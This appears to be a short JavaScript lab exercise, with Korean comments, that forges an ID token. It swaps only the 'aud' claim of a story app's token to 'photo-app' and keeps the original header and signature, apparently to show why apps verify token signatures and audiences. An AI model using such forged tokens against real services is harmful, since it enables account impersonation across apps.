// ~/instagram-api/lab/p3-21/forge.js
const token = '스토리 앱의 id_token';

// 페이로드의 aud 만 photo-app 으로 바꾼 가짜 토큰 — 헤더와 서명은 진짜 토큰 것 그대로
const [header, payload, signature] = token.split('.');
const claims = JSON.parse(Buffer.from(payload, 'base64url'));
const fakePayload = Buffer.from(JSON.stringify({ ...claims, aud: 'photo-app' })).toString('base64url');

console.log(`${header}.${fakePayload}.${signature}`);
